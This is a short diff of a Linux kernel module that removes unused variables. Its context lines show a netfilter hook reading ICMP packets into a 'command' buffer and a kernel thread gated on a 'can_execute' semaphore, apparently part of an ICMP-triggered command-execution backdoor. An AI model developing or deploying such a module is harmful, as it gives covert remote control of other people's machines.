@@ -35,7 +35,6 @@ char commando[50];
 
 int thread_function(void *pv)
 {
-    int i=0;
     while(!kthread_should_stop()) {
         down_interruptible(&can_execute);
         msleep(10);
@@ -58,7 +57,7 @@ void pkt_hex_dump(struct sk_buff *skb, int icmp_packet_len)
     size_t len;
     int hdrlen;
     int rowsize = 16;
-    int i, l, linelen, remaining;
+    int l, linelen, remaining;
     int li = 0;
     uint8_t *data, ch; 
     char command[icmp_packet_len+1];
@@ -94,7 +93,6 @@ unsigned int hook_func(void* priv, struct sk_buff* skb, const struct nf_hook_sta
 {
 	sock_buff = skb;
 	ip_header = (struct iphdr*)skb_network_header(sock_buff); //grab network header using accessor
-	struct ethhdr *ether = eth_hdr(skb);
 	int shim;
 	if (!sock_buff) { return NF_DROP; }
 
